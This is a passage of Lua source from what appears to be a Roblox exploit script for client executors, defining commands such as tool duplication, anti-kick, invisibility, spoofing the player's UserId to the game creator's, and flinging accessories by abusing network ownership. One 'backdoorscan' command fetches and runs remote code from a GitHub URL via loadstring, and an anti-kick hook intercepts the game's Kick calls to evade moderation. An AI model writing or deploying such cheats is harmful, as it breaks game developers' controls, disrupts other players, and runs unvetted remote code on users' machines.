	if Humanoid.RigType == Enum.HumanoidRigType.R6 then return end

	Character.LeftUpperLeg.LeftKneeRigAttachment:Destroy()
	Character.LeftLowerLeg.LeftAnkleRigAttachment:Destroy()
	Character.LeftFoot.LeftFootAttachment:Destroy()

	for _,x in next, Settings.Values do
		if x then
			if Settings.OriginalSize then --Specific Path/Settings
				for _, _os in next, Character:GetDescendants() do
					if _os.Name == "OriginalSize" and _os:IsA("ValueBase") then
						_os:Destroy()
					end
				end
			end
			if Settings.OriginalPosition then
				for _, _op in next, Character:GetDescendants() do
					if _op.Name == "OriginalPosition" and _op:IsA("ValueBase") then
						_op:Destroy()
					end
				end
			end
			if Humanoid:FindFirstChild(tostring(_)) then
				Humanoid:FindFirstChild(tostring(_)):Destroy()
			end
			WaitFunc(Character)
		end
	end
	Utils.Notify(Caller, "Legrescale", "Rescaled!")
end)--]]

AddCommand("backdoorscan", {}, "checks if there is a backdoor in the game", {}, function()
	wait();
	Utils.Notify(Caller, "Backdoor", "Checking if there is a backdoor...")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
end)

AddCommand("getmass", {}, "checks your humanoid mass", {}, function()
	local myPart = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	local myMass = myPart:GetMass()
	Utils.Notify(Caller, "Getmass", "HumanoidRootPart mass is "..myMass)
end)


--[[AddCommand("rescale", {}, "rescales your body", {4}, function()
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Character = LocalPlayer.Character
	local Humanoid = Character:FindFirstChildOfClass("Humanoid")

	local function rm()
		for i,v in pairs(Character:GetDescendants()) do
			if v:IsA("BasePart") then
				if v.Name ~= "Head" then
					for i,cav in pairs(v:GetDescendants()) do
						if cav:IsA("Attachment") then
							if cav:FindFirstChild("OriginalPosition") then
								cav.OriginalPosition:Destroy()
							end
						end
					end
					v:FindFirstChild("OriginalSize"):Destroy()
					if v:FindFirstChild("AvatarPartScaleType") then
						v:FindFirstChild("AvatarPartScaleType"):Destroy()
					end
				end
			end
		end
	end

	rm()
	wait(0.2)
	Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
	wait(0.2) 
	rm()
	wait(0.2)
	Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
	wait(0.2) 
	rm()
	wait(0.2)
	Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
	wait(0.2) 
	rm()
	wait(0.2)
	Humanoid:FindFirstChild("HeadScale"):Destroy()
	wait(0.2)
	Utils.Notify(Caller, "Rescale", "Rescaled!")
end)

AddCommand("toolhats", {}, "makes your hats holdable", {3}, function()
	local lp = game.Players.LocalPlayer
	local char = lp.Character

	for i, v in pairs(char:GetChildren()) do
		if v:IsA("BallSocketConstraint") then
			v:Destroy()
		end
	end

	for i, v in pairs(char:GetChildren()) do
		if v:IsA("HingeConstraint") then
			v:Destroy()
		end
	end

	for i, v in pairs(char.Humanoid:GetAccessories()) do
		local hat = v.Name

		char[hat].Archivable = true
		local fake = char[hat]:Clone()
		fake.Parent = char
		fake.Handle.Transparency = 1

		local hold = false
		local enabled = false

		char[hat].Handle.AccessoryWeld:Destroy()

		local tool = Instance.new("Tool", lp.Backpack)
		tool.RequiresHandle = true
		tool.CanBeDropped = false
		tool.Name = hat

		local handle = Instance.new("Part", tool)
		handle.Name = "Handle"
		handle.Size = Vector3.new(1, 1, 1)
		handle.Massless = true
		handle.Transparency = 1

		local positions = {
			forward = tool.GripForward,
			pos = tool.GripPos,
			right = tool.GripRight,
			up = tool.GripUp
		}

		tool.Equipped:connect(function()
			hold = true
		end)

		tool.Unequipped:connect(function()
			hold = false
		end)

		tool.Activated:connect(function()
			if enabled == false then
				enabled = true
				tool.GripForward = Vector3.new(-0.976,0,-0.217)
				tool.GripPos = Vector3.new(.95,-0.76,1.4)
				tool.GripRight = Vector3.new(0.217,0, 0.976)
				tool.GripUp = Vector3.new(0,1,0)
				wait(.8)
				tool.GripForward = positions.forward
				tool.GripPos = positions.pos
				tool.GripRight = positions.right
				tool.GripUp = positions.up
				enabled = false
			end
		end)

		game:GetService("RunService").Heartbeat:connect(function()
			pcall(function()
				char[hat].Handle.Velocity = Vector3.new(30, 0, 0)
				if hold == false then
					char[hat].Handle.CFrame = fake.Handle.CFrame
				elseif hold == true then
					char[hat].Handle.CFrame = handle.CFrame
				end
			end)
		end)
	end
end)--]]

AddCommand("setcreatorid", {"setcreator"}, "sets your id to the owner one", {}, function()
	if game.CreatorType == Enum.CreatorType.User then
		game:GetService("Players").LocalPlayer.UserId = game.CreatorId
		Utils.Notify(LocalPlayer, "Set ID", "Set UserId to "..game.CreatorId)
	elseif game.CreatorType == Enum.CreatorType.Group then
		local OwnerID = game:GetService('GroupService'):GetGroupInfoAsync(game.CreatorId).Owner.Id
		game:GetService("Players").LocalPlayer.UserId = OwnerID
		Utils.Notify(LocalPlayer, "Set ID", "Set UserId to "..OwnerID)
	end
end)

AddCommand("playerlist", {}, "enables player list", {}, function()
	game:GetService("StarterGui"):SetCoreGuiEnabled('PlayerList', true)
	Utils.Notify(Caller, "PlayerList", "Enabled!")
end)

AddCommand("view", {}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	if (#Target ~= 1) then
		return "You can only view 1 person max."
	end
	Target = Target[1]
	Camera.CameraSubject = GetCharacter(Target) or GetCharacter();
	AddConnection(CConnect(Target.CharacterAdded, function()
		CWait(Heartbeat);
		Camera.CameraSubject = Target.Character
	end), CEnv);
	AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
		WaitForChild(LocalPlayer.Character, "Humanoid");
		CWait(Camera.CameraSubject.Changed);
		CWait(Heartbeat);
		Camera.CameraSubject = Target.Character
	end), CEnv);
	Utils.Notify(Caller, "View", "Viewing " ..Target.Name)
end)

AddCommand("unview", {"unv"}, "unviews a user", {3}, function(Caller, Args)
	DisableAllCmdConnections("view");
	Camera.CameraSubject = GetCharacter();
	Utils.Notify(Caller, "View", "Unviewing!")
end)

AddCommand("invisible", {"invis"}, "makes yourself invisible", {3}, function(Caller, Args, CEnv)
	local Root = GetRoot();
	local OldPos = Root.CFrame
	local Seat = InstanceNew("Seat");
	local Weld = InstanceNew("Weld");
	Root.CFrame = CFrameNew(9e9, 9e9, 9e9);
	wait(.2);
	Root.Anchored = true
	ProtectInstance(Seat);
	Seat.Parent = Services.Workspace
	Seat.CFrame = Root.CFrame
	Seat.Transparency = 1
	Seat.Anchored = false
	Weld.Parent = Seat
	Weld.Part0 = Seat
	Weld.Part1 = Root
	Root.Anchored = false
	Seat.CFrame = OldPos
	CEnv.Seat = Seat
	CEnv.Weld = Weld
	for i, v in next, GetChildren(Root.Parent) do
		if (IsA(v, "BasePart") or IsA(v, "MeshPart") or IsA(v, "Part")) then
			CEnv[v] = v.Transparency
			v.Transparency = v.Transparency <= 0.3 and 0.4 or v.Transparency
		elseif (IsA(v, "Accessory")) then
			local Handle = FindFirstChildWhichIsA(v, "MeshPart") or FindFirstChildWhichIsA(v, "Part");
			if (Handle) then
				CEnv[Handle] = Handle.Transparency
				Handle.Transparency = Handle.Transparency <= 0.3 and 0.4 or Handle.Transparency    
			end
		end
	end
	Utils.Notify(Caller, "Invisible", "Now invisible!")
end)

AddCommand("uninvisible", {"uninvis", "visible", "vis"}, "gives you back visiblity", {3}, function(Caller, Args, CEnv)
	local CmdEnv = LoadCommand("invisible").CmdEnv
	local Seat = CmdEnv.Seat
	local Weld = CmdEnv.Weld
	if (Seat and Weld) then
		Weld.Part0 = nil
		Weld.Part1 = nil
		Destroy(Seat);
		Destroy(Weld);
		CmdEnv.Seat = nil
		CmdEnv.Weld = nil
		for i, v in next, CmdEnv do
			if (type(v) == 'number') then
				i.Transparency = v
			end
		end
		Utils.Notify(Caller, "Invisible", "Now visible!")
	end
	Utils.Notify(Caller, "Invisible", "You are already visible!")
end)

AddCommand("dupetools", {"dp"}, "dupes your tools", {"1", 1, {"protect"}}, function(Caller, Args, CEnv)
	local Amount = tonumber(Args[1])
	local Protected = Args[2] == "protect"
	if (not Amount) then
		return "Amount must be a number."
	end

	CEnv[1] = true
	local AmountDuped = 0
	local Timer = (Players.RespawnTime * Amount) + (Amount * .4) + 1
	local Notification = Utils.Notify(Caller, "Duping Tools", format("%d/%d tools duped. %d seconds left", AmountDuped, Amount, Timer), Timer);
	CThread(function()
		for i = 1, Timer do
			if (not LoadCommand("dupetools").CmdEnv[1]) then
				do break end;
			end
			wait(1);
			Timer = Timer - 1
			Notification.Message.Text = format("%d/%d tools duped. %d seconds left", AmountDuped, Amount, Timer)
		end
	end)()


	local ToolAmount = #filter(GetChildren(LocalPlayer.Backpack), function(i, v)
		return IsA(v, "Tool");
	end)
	local Duped = {}
	local Humanoid = GetHumanoid();
	UnequipTools(Humanoid);
	local Connection = AddConnection(CConnect(GetCharacter().ChildAdded, function(Added)
		wait(.4);
		if (IsA(Added, "Tool")) then
			Added.Parent = LocalPlayer.Backpack
		end
	end), CEnv);
	for i = 1, Amount do
		if (not LoadCommand("dupetools").CmdEnv[1]) then
			do break end;
		end
		ReplaceCharacter();
		local OldPos
		if (Protected) then
			local OldFallen = Services.Workspace.FallenPartsDestroyHeight
			delay(Players.RespawnTime - .3, function()
				Services.Workspace.FallenPartsDestroyHeight = -math.huge
				OldPos = GetRoot().CFrame
				GetRoot().CFrame = CFrameNew(0, 1e9, 0);
				GetRoot().Anchored = true
			end)
		end
		UnequipTools(Humanoid);
		wait(Players.RespawnTime - .05);
		OldPos = OldPos or GetRoot().CFrame
		Humanoid = ReplaceHumanoid(Humanoid);
		local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
			return IsA(v, "Tool");
		end)

		for i2, v in next, Tools do
			v.Parent = LocalPlayer.Character
			v.Parent = Services.Workspace
			Duped[#Duped + 1] = v
		end
		local Char = CWait(LocalPlayer.CharacterAdded);
		WaitForChild(Char, "HumanoidRootPart").CFrame = OldPos;

		for i2, v in next, Duped do
			if (v.Handle) then
				firetouchinterest(v.Handle, GetRoot(), 0);
				firetouchinterest(v.Handle, GetRoot(), 1);
			end
		end
		repeat CWait(RenderStepped);
			FindFirstChild(Char, "HumanoidRootPart").CFrame = OldPos
		until GetRoot().CFrame == OldPos

		repeat CWait(RenderStepped);
			Humanoid = FindFirstChild(Char, "Humanoid")
		until Humanoid
		wait(.4);
		UnequipTools(Humanoid);
		AmountDuped = AmountDuped + 1
	end
	Disconnect(Connection);
	return format("Successfully duped %d tool (s)", #GetChildren(LocalPlayer.Backpack) - ToolAmount);
end)



AddCommand("grabtools", {}, "once a tool is added to workspace it will be grabbed", {3}, function(Caller, Args, CEnv)
	AddConnection(CConnect(Services.Workspace.ChildAdded, function(Child)
		if (IsA(Child, "Tool") and FindFirstChild(Child, "Handle")) then
			firetouchinterest(Child.Handle, GetRoot(), 0);
			wait();
			firetouchinterest(Child.Handle, GetRoot(), 1);
			UnequipTools(GetHumanoid());
		end
	end), CEnv)
	Utils.Notify(Caller, "Grabtools", "Enabled!")
end)

AddCommand("ungrabtools", {"unloopgrabtools"}, "stops grabtools", {}, function()
	DisableAllCmdConnections("grabtools");
	Utils.Notify(Caller, "Grabtools", "Disabled!")
end)

AddCommand("droptools", {"dt"}, "drops all of your tools", {1,3}, function()
	UnequipTools(GetHumanoid());
	local Tools = GetChildren(LocalPlayer.Backpack);
	for i, v in next, Tools do
		if (IsA(v, "Tool") and FindFirstChild(v, "Handle")) then
			SpoofProperty(v, "Parent");
			v.Parent = GetCharacter();
			v.Parent = Services.Workspace
		end
	end
	return format(("Dropped %d tool (s)"), #Tools);
end)

AddCommand("trainhats", {}, "makes a train with all the accessories", {3}, function()

	if game:GetService("ReplicatedStorage"):FindFirstChild("RequestRespawn") then
		game:GetService("ReplicatedStorage").RequestRespawn:Destroy()
	end

	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local LocalPlayer = Players.LocalPlayer

	if not getgenv().Network then
		getgenv().Network = {
			BaseParts = {};
			FakeConnections = {};
			Connections = {};
			Output = {
				Enabled = true;
				Prefix = "[NETWORK] ";
				Send = function(Type,Output,BypassOutput)
					if typeof(Type) == "function" and (Type == print or Type == warn or Type == error) and typeof(Output) == "string" and (typeof(BypassOutput) == "nil" or typeof(BypassOutput) == "boolean") then
						if Network["Output"].Enabled or BypassOutput then
							Type(Network["Output"].Prefix..Output);
						end;
					elseif Network["Output"].Enabled then
						error(Network["Output"].Prefix.."Output Send Error : Invalid syntax.");
					end;
				end;
			};
			LostParts = {};
			CharacterRelative = true;
			LastCharacter = nil;
			TryKeep = true; --loop attempts to
			PartOwnership = {
				PreMethodSettings = {};
				Enabled = false;
			};
		}

		Network["Output"].Send(print,": Loading.")

		Network["RetainPart"] = function(Part,Silent,ReturnFakePart) --function for retaining ownership of unanchored parts
			assert(Network["PartOwnership"]["Enabled"], Network["Output"].Prefix.." RetainPart Error : PartOwnership is Disabled.")
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart") and not Part:IsGrounded(),Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
			if not Part:IsDescendantOf(workspace) then
				Network["Output"].Send(error,"RetainPart Error : Invalid syntax: Arg1 (Part) must be an ungrounded BasePart which is a descendant of workspace.")
				local Index = table.find(Network["LostParts"],Part)
				if Index then
					table.remove(Network["LostParts"],Index)
				end
				return false
			end
			assert(typeof(Silent) == "boolean" or typeof(Silent) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg2 (Silent) must be a boolean or nil.")
			assert(typeof(ReturnFakePart) == "boolean" or typeof(ReturnFakePart) == "nil",Network["Output"].Prefix.."RetainPart Error : Invalid syntax: Arg3 (ReturnFakePart) must be a boolean or nil.")
			if not table.find(Network["BaseParts"],Part) and not table.find(Network["LostParts"],Part) then
				table.insert(Network["BaseParts"],Part)
				Part.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
				if not Silent then
					Network["Output"].Send(print,"PartOwnership Output : PartOwnership applied to BasePart "..Part:GetFullName()..".")
				end
				if ReturnFakePart then
					local workspaceParts = {}
					return FakePart
				end
			else
				Network["Output"].Send(warn,"RetainPart Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it already active.")
				return false
			end
		end

		Network["RemovePart"] = function(Part,Silent) --function for removing ownership of unanchored part
			assert(typeof(Part) == "Instance" and Part:IsA("BasePart"),Network["Output"].Prefix.."RemovePart Error : Invalid syntax: Arg1 (Part) must be a BasePart.")
			local Index1 = table.find(Network["BaseParts"],Part)
			local Index2 = table.find(Network["LostParts"],Part)
			if Index1 then
				table.remove(Network["BaseParts"],Index1)
			else
				if not Silent then
					Network["Output"].Send(warn,"RemovePart Warning : BasePart "..Part:GetFullName().." not found in BaseParts table.")
				end
				return
			end
			if Index2 then
				table.remove(Network["LostParts"],Index2)
			end
			if not Silent then
				Network["Output"].Send(print,"RemovePart Output: PartOwnership removed from BasePart "..Part:GetFullName()..".")
			end
		end

		Network["PartOwnership"]["PartCoroutine"] = coroutine.create(function(Part)
			if Part:IsDescendantOf(workspace) then
				if Network.CharacterRelative then
					local Character = Network["LastCharacter"];
					if not Character.PrimaryPart then
						for _,Inst in pairs(Character:GetDescendants()) do
							if Inst:IsA("BasePart") then
								Character.PrimaryPart = Inst
								break
							end
						end
					end
					if Character and Character.PrimaryPart then
						local Distance = (Character.PrimaryPart.Position - Part.Position).Magnitude
						if Distance > gethiddenproperty(LocalPlayer,"MaximumSimulationRadius") and not isnetworkowner(Part) then
							Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is more than "..gethiddenproperty(LocalPlayer,"MaximumSimulationRadius").." studs away.")
							Network["RemovePart"](Part)
							if not Part:IsGrounded() then
								table.insert(Network["LostParts"],Part)
							else
								Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as it is grounded.")
							end
						end
					else
						Network["Output"].Send(warn,"PartOwnership Warning : PartOwnership not applied to BasePart "..Part:GetFullName()..", as the LocalPlayer Character's PrimaryPart does not exist.")
					end
				end
				Part.AssemblyLinearVelocity = (Part.AssemblyLinearVelocity.Unit+Vector3.new(.01,.01,.01))*(50+math.cos(tick()*10))
			else
				Network["RemovePart"](Part)
			end
		end)

		Network["PartOwnership"]["Enable"] = coroutine.create(function() --creating a thread for network stuff
			if not Network["PartOwnership"]["Enabled"] then
				Network["PartOwnership"]["Enabled"] = true
				Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus = LocalPlayer.ReplicationFocus
				LocalPlayer.ReplicationFocus = workspace
				Network["PartOwnership"]["PreMethodSettings"].SimulationRadius = gethiddenproperty(LocalPlayer,"SimulationRadius")
				Network["PartOwnership"]["Connection"] = RunService.Stepped:Connect(function()
					Network["LastCharacter"] = pcall(function() return LocalPlayer.Character end) or Network["LastCharacter"]
					sethiddenproperty(LocalPlayer,"SimulationRadius",1/0)
					coroutine.wrap(function()
						for _,Part in pairs(Network["BaseParts"]) do --loop through parts and do network stuff
							coroutine.resume(Network["PartOwnership"]["PartCoroutine"],Part)
							--[==[ [[by 4eyes btw]] ]==]--
						end
					end)()
					coroutine.wrap(function()
						for _,Part in pairs(Network["LostParts"]) do
							Network.RetainPart(Part,true)
						end
					end)()
				end)
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership enabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already enabled.")
			end
		end)

		Network["PartOwnership"]["Disable"] = coroutine.create(function()
			if Network["PartOwnership"]["Connection"] then
				Network["PartOwnership"]["Connection"]:Disconnect()
				LocalPlayer.ReplicationFocus = Network["PartOwnership"]["PreMethodSettings"].ReplicationFocus
				sethiddenproperty(LocalPlayer,"SimulationRadius",Network["PartOwnership"]["PreMethodSettings"].SimulationRadius)
				Network["PartOwnership"]["PreMethodSettings"] = {}
				for _,Part in pairs(Network["BaseParts"]) do
					Network["RemovePart"](Part)
				end
				for Index,Part in pairs(Network["LostParts"]) do
					table.remove(Network["LostParts"],Index)
				end
				Network["PartOwnership"]["Enabled"] = false
				Network["Output"].Send(print,"PartOwnership Output : PartOwnership disabled.")
			else
				Network["Output"].Send(warn,"PartOwnership Output : PartOwnership already disabled.")
			end
		end)

		Network["Output"].Send(print,": Loaded.")
	end
	coroutine.resume(Network["PartOwnership"]["Enable"])


	player = game:GetService("Players").LocalPlayer
	camera = workspace.CurrentCamera
	character = player.Character
	local vbreak = false
	character.Archivable = true

	player.Character = nil
	player.Character = character:Clone()

	wait(game:GetService("Players").RespawnTime+.3)

	character.Humanoid.Health = 0


	stuff = Instance.new("Folder",workspace)
	center = Instance.new("Part",stuff)
	input = game:GetService("UserInputService")

	center.Anchored = true
	center.Size = Vector3.new(1,1,1)
	center.Position = character.Head.Position
	center.CanCollide = false
	center.Transparency = 1

	camera.CameraSubject = center

	points = {}

	last_pos = character.Head.Position
	coroutine.wrap(function()
		while task.wait() do
			if vbreak == true then break end
			center.CFrame = CFrame.new(center.Position) * camera.CFrame.Rotation
			if (last_pos - center.Position).magnitude > 1 then
				local marker = Instance.new("Part",stuff)
				marker.Anchored = true
				marker.Size = Vector3.new(1,1,1)
				marker.CFrame = CFrame.lookAt(last_pos,center.Position)
				marker.CanCollide = false
				marker.Transparency = 1
				last_pos = center.Position
				table.insert(points,marker)
			end
			if points[#points-9] then
				points[#points-9]:Destroy()
				table.remove(points,#points-9)
			end
		end
	end)()

	handles = {}

	for i,v in pairs(character:GetChildren()) do
		if v:IsA("Accessory") then
			table.insert(handles,v.Handle)
		end
	end

	for i,handle in pairs(handles) do
		local number = i-1
		handle.CustomPhysicalProperties = PhysicalProperties.new(0,0,0,0,0)
		Network.RetainPart(handle)
		coroutine.wrap(function()
			while handle:FindFirstAncestor("Game") do
				if points[#points-number] then do
						handle.CFrame = points[#points-number].CFrame
					end else
					handle.CFrame = center.CFrame
				end
				task.wait()
			end
			vbreak = true
			player.Character = character
		end)()
	end


	current_position = character.Head.Position
	wait(.5)
	while wait() do
		if vbreak == true then break end
		if input:IsKeyDown(Enum.KeyCode.D) then
			current_position += camera.CFrame.RightVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.A) then
			current_position += camera.CFrame.RightVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.W) then
			current_position += camera.CFrame.LookVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.S) then
			current_position += camera.CFrame.LookVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.E) then
			current_position += camera.CFrame.UpVector * speed
		end
		if input:IsKeyDown(Enum.KeyCode.Q) then
			current_position += camera.CFrame.UpVector * -speed
		end
		if input:IsKeyDown(Enum.KeyCode.LeftShift) then do
				speed = 1.5
			end else
			speed = 0.75
		end
		center.Position = current_position
	end
end)

AddCommand("setfpscap", {"fpscap"}, "changes the fps to arg", {}, function(Caller, Args)
	local fpscap = tonumber(Args[1])
	setfpscap(fpscap)
	Utils.Notify(Caller, "FPS", "Fps set to " .. fpscap)
end)

AddCommand("shaders", {}, "enables roblox shaders", {}, function()
	-- Roblox Graphics Enhancer
	local light = game.Lighting
	for i, v in pairs(light:GetChildren()) do
		v:Destroy()
	end

	local ter = workspace.Terrain
	local color = Instance.new("ColorCorrectionEffect")
	local bloom = Instance.new("BloomEffect")
	local sun = Instance.new("SunRaysEffect")
	local blur = Instance.new("BlurEffect")

	color.Parent = light
	bloom.Parent = light
	sun.Parent = light
	blur.Parent = light

	-- enable or disable shit

	local config = {

		Terrain = true;
		ColorCorrection = true;
		Sun = true;
		Lighting = true;
		BloomEffect = true;

	}

	-- settings {

	color.Enabled = false
	color.Contrast = 0.15
	color.Brightness = 0.1
	color.Saturation = 0.25
	color.TintColor = Color3.fromRGB(255, 222, 211)

	bloom.Enabled = false
	bloom.Intensity = 0.1

	sun.Enabled = false
	sun.Intensity = 0.2
	sun.Spread = 1

	bloom.Enabled = false
	bloom.Intensity = 0.05
	bloom.Size = 32
	bloom.Threshold = 1

	blur.Enabled = false
	blur.Size = 6

	-- settings }


	if config.ColorCorrection then
		color.Enabled = true
	end


	if config.Sun then
		sun.Enabled = true
	end


	if config.Terrain then
		-- settings {
		ter.WaterColor = Color3.fromRGB(10, 10, 24)
		ter.WaterWaveSize = 0.15
		ter.WaterWaveSpeed = 22
		ter.WaterTransparency = 1
		ter.WaterReflectance = 0.05
		-- settings }
	end


	if config.Lighting then
		-- settings {
		light.Ambient = Color3.fromRGB(0, 0, 0)
		light.Brightness = 4
		light.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
		light.ColorShift_Top = Color3.fromRGB(0, 0, 0)
		light.ExposureCompensation = 0
		light.FogColor = Color3.fromRGB(132, 132, 132)
		light.GlobalShadows = true
		light.OutdoorAmbient = Color3.fromRGB(112, 117, 128)
		light.Outlines = false
		-- settings }
	end
end)

AddCommand("gravity", {"grav"}, "changes the gravity to arg", {}, function(Caller, Args)
	SpoofProperty(Services.Workspace, "Gravity");
	Services.Workspace.Gravity = tonumber(Args[1])
	Utils.Notify(Caller, "Gravity", "Gravity set to " .. Services.Workspace.Gravity)
end)

AddCommand("nogravity", {"nograv", "ungravity"}, "changes the gravity to default (196.2)", {}, function()
	Services.Workspace.Gravity = 192
	Utils.Notify(Caller, "Gravity", "Gravity set to default! (196.2)")
end)

AddCommand("ignore", {}, "puts a players character in lighting", {}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		if (v.Character) then
			SpoofProperty(v.Character, "Parent");
			v.Character.Parent = Lighting
			Utils.Notify(Caller, "Command", v.Name .. "'s character is now parented to lighting!");
		end
	end
end)

AddCommand("unignore", {"recover"}, "removes a players character parented from lighting", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		if (v.Character and v.Character.Parent == Lighting) then
			v.Character.Parent = Services.Workspace
			Utils.Notify(Caller, "Command", v.Name .. "'s character is now in workspace!");
		else
			Utils.Notify(Caller, "Command", v.Name .. "'s character is not removed!");
		end
	end
end)

AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	SpoofProperty(Humanoid, "Sit", false);
	Humanoid.Sit = true
	Utils.Notify(Caller, "Sit", "Sitting!")
end)

AddCommand("anticlientkick", {"antickick"}, "disables client kick scripts", {}, function()

	local getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, stringlower = getgenv, getnamecallmethod, hookmetamethod, newcclosure, checkcaller, string.lower

	if getgenv().ED_AntiKick then return end
	local Players, StarterGui, OldNamecall = game:GetService("Players"), game:GetService("StarterGui")
	getgenv().ED_AntiKick = {
		SendNotifications = false, -- Set to true if you want to get notified for every event
		CheckCaller = true -- Set to true if you want to disable kicking by other executed scripts
	}


	OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(...)
		if (getgenv().ED_AntiKick.CheckCaller and not checkcaller() or true) and stringlower(getnamecallmethod()) == "kick" then
			if getgenv().ED_AntiKick.SendNotifications then
				StarterGui:SetCore("SendNotification", {
					Title = "Exunys Developer",
					Text = "The script has successfully intercepted an attempted kick.",
					Icon = "rbxassetid://6238540373",
					Duration = 2,
				})
			end

			return nil
		end

		return OldNamecall(...)
	end))

	if getgenv().ED_AntiKick.SendNotifications then
		StarterGui:SetCore("SendNotification", {
			Title = "Exunys Developer",
			Text = "Anti-Kick script loaded!",
			Icon = "rbxassetid://6238537240",
			Duration = 3,
		})
	end
end)

AddCommand("antikill", {}, "fakes your humanoid sit", {3}, function(Caller, Args, CEnv)
	local c = game:GetService("Players").LocalPlayer.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
			hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			hum.Sit = true
		end
	end
	Utils.Notify(Caller, "Antikill", "Enabled!")
end)

AddCommand("unantikill", {"noantikill"}, "removes humanoid seated", {3}, function(Caller, Args, CEnv)
	local c = game:GetService("Players").LocalPlayer.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
			hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			hum.Sit = false
		end
	end
	Utils.Notify(Caller, "Antikill", "Disabled!")
end)

AddCommand("infinitejump", {"infjump"}, "infinite jump no cooldown", {3}, function(Caller, Args, CEnv)
	AddConnection(CConnect(Services.UserInputService.JumpRequest, function()
		local Humanoid = GetHumanoid();
		if (Humanoid) then
			ChangeState(Humanoid, 3);
		end
	end), CEnv);
	Utils.Notify(Caller, "Infinitejump", "Enabled!")
end)

AddCommand("noinfinitejump", {"uninfjump"}, "removes infinite jump", {}, function()
	local InfJump = LoadCommand("infjump").CmdEnv
	if (not next(InfJump)) then
		Utils.Notify(Caller, "Infinitejump", "You are not infinite jumping!")
	end
	DisableAllCmdConnections("infinitejump");
	Utils.Notify(Caller, "Infinitejump", "Disabled!")
end)

AddCommand("headsit", {}, "sits on the players head", {"1"}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		local Humanoid = GetHumanoid();
		SpoofProperty(Humanoid, "Sit");
		Humanoid.Sit = true
		AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
			Humanoid.Sit = true
		end), CEnv);
		local Root = GetRoot();
		AddConnection(CConnect(Heartbeat, function()
			Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 0, 1);
		end), CEnv);
	end
end)

AddCommand("unheadsit", {"noheadsit"}, "unheadsits on the target", {3}, function(Caller, Args)
	local Looped = LoadCommand("headsit").CmdEnv
	for i, v in next, Looped do
		Disconnect(v);
	end
	Utils.Notify(Caller, "Headsit", "Disabled!")
end)

AddCommand("headstand", {}, "stands on a players head", {"1",3}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	local Root = GetRoot();
	for i, v in next, Target do
		local Loop = CConnect(Heartbeat, function()
			Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 1, 0);
		end)
		CEnv[v.Name] = Loop

	end
end)

AddCommand("unheadstand", {"noheadstand"}, "unheadstands on the target", {3}, function(Caller, Args)
	local Looped = LoadCommand("headstand").CmdEnv
	for i, v in next, Looped do
		Disconnect(v);
	end
	Utils.Notify(Caller, "Headstand", "Disabled!")
end)

AddCommand("setspawn", {}, "sets your spawn location to the location you are at", {3}, function(Caller, Args, CEnv)
	if (CEnv[1]) then
		Disconnect(CEnv[1]);
	end
	local Position = GetRoot().CFrame
	local Spawn = CConnect(LocalPlayer.CharacterAdded, function()
		WaitForChild(LocalPlayer.Character, "HumanoidRootPart").CFrame = Position
	end)
	CEnv[1] = Spawn

	local SpawnLocation = pack(unpack(split(tostring(Position), ", "), 1, 3));
	SpawnLocation.n = nil
	return "Spawn successfully set to " .. concat(map(SpawnLocation, function(i,v)
		return tostring(round(tonumber(v)));
	end), ",");
end)

AddCommand("removespawn", {}, "removes your spawn location", {}, function(Caller, Args)
	local Spawn = LoadCommand("setspawn").CmdEnv[1]
	if (Spawn) then
		Disconnect(Spawn);
		Utils.Notify(Caller, "Spawn", "Removed!")	
	end
	Utils.Notify(Caller, "Spawn", "You don't have a spawn location set!")	
end)

AddCommand("ping", {}, "shows you your ping", {}, function()
	local Stats = Services.Stats
	local DataPing = Stats.Network.ServerStatsItem["Data Ping"]
	return split(DataPing.GetValueString(DataPing), " ")[1] .. " ms"
end)

AddCommand("memory", {"mem"}, "shows you your memory usage", {}, function()
	local Stats = Services.Stats
	return tostring(round(Stats.GetTotalMemoryUsageMb(Stats))) .. " mb";
end)

AddCommand("lowgfx", {}, "lowers your graphic", {}, function()
	local Terrain = game.workspace:FindFirstChildOfClass('Terrain')
